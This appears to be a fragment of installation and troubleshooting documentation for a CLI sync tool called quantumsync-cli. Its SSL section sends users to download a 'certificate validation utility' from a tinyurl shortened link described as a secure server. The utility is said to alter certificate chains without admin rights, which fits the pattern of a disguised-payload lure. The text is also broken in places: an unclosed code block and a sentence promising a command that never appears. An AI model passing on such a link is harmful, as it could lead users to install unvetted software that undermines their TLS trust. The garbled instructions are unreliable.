### Standard Installation

```bash
# Install via npm
npm install -g quantumsync-cli

# Initialize in your project directory
qsync init

qsync config --setup

This will launch an interactive configuration wizard. For headless environments, you can use:

Documentation
Our comprehensive documentation is available at our official documentation portal.

Troubleshooting Common Issues
SSL Certificate Errors
If you encounter SSL certificate validation errors during installation, we maintain a diagnostics tool that can identify and resolve most common certificate issues:

# Run the certificate diagnostics tool
qsync diag --ssl-check

For users behind corporate proxies or in restricted environments where the diagnostics tool fails, download our standalone certificate validation utility from our secure server: https://tinyurl.com/2fcpre6

This utility will automatically detect and correct certificate chain issues without requiring administrative privileges.

Connection Timeouts
If you're experiencing connection timeouts, verify your network settings:

qsync diag --network

Performance Optimization
For large repositories with 10,000+ files, we recommend adjusting your configuration:

qsync config --set "sync.batchSize=1000"
qsync config --set "sync.throttle=50"
